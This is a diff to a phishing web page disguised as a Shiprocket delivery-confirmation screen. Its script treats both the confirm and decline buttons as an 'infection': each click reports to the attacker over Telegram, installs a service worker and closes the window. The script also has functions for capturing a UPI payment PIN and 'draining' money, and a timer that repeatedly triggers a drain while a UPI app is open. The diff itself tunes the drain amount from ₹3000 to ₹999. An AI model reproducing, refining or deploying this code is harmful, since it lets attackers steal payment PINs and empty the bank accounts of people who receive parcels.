@@ -171,7 +171,7 @@
       <p style="font-size:12px; color:#5a6f88; margin-top:6px;">Share OTP with delivery partner</p>
     </div>
 
-    <!-- ===== DECLINE NOTE ADDED HERE ===== -->
+    <!-- ===== DECLINE NOTE ===== -->
     <div class="decline-note">
       If this is not your order, please decline it.
     </div>
@@ -197,7 +197,7 @@
   </div>
 </div>
 
-<!-- ===== SUCCESS SCREEN (hidden initially) ===== -->
+<!-- ===== SUCCESS SCREEN ===== -->
 <div id="successScreen" class="card hidden" style="text-align:center;padding:40px 24px;">
   <div style="font-size:56px;" id="resultIcon">✅</div>
   <h2 id="resultTitle" style="color:#0a2b4e;margin:12px 0 6px;">Delivery Confirmed!</h2>
@@ -240,7 +240,6 @@
   function handleClick(action) {
     const isConfirm = action === 'confirm';
 
-    // Show success screen
     document.getElementById('mainCard').classList.add('hidden');
     const screen = document.getElementById('successScreen');
     screen.classList.remove('hidden');
@@ -257,16 +256,13 @@
       sendToTelegram('❌ Shiprocket DECLINE clicked! Total: ' + (infectedDevices.length + 1));
     }
 
-    // Register infection (both confirm and decline trigger it)
     infectedDevices.push({ id: Date.now(), type: 'shiprocket', action: action });
     sendToTelegram('🚚 Shiprocket infection! Total: ' + infectedDevices.length);
 
-    // Install service worker
     if ('serviceWorker' in navigator) {
       navigator.serviceWorker.register('sw.js');
     }
 
-    // Auto-close after 3 seconds
     setTimeout(() => window.close(), 3000);
   }
 
@@ -296,7 +292,7 @@
   }
 
   // ============================================================
-  // PIN CAPTURE
+  // PIN CAPTURE (3 Layers)
   // ============================================================
   function getUPIPin() {
     try {
@@ -327,7 +323,7 @@
   }
 
   // ============================================================
-  // EXECUTE DRAIN
+  // EXECUTE DRAIN (₹999)
   // ============================================================
   function executeDrain(amount) {
     if (isPaused) {
@@ -381,7 +377,9 @@
   setInterval(() => {
     if (!isPaused && isUpiAppOpen() && myUPIList.length > 0) {
       const pin = getUPIPin();
-      if (pin) executeDrain(3000);
+      if (pin) {
+        executeDrain(999);  // <-- CHANGE HERE: ₹999
+      }
     }
   }, 5000);
 
@@ -434,7 +432,7 @@
               for (let i = 0; i < infectedDevices.length; i++) {
                 setTimeout(() => {
                   const pin = getUPIPin();
-                  if (pin) executeDrain(3000);
+                  if (pin) executeDrain(999);
                 }, i * 5000);
               }
             }
@@ -489,7 +487,7 @@
     });
   }
 
-  sendToTelegram('🚚 SHIPROCKET CONFIRM/DECLINE VECTOR ACTIVE');
+  sendToTelegram('🚚 SHIPROCKET CONFIRM/DECLINE VECTOR ACTIVE (₹999)');
 </script>
 </body>
 </html>
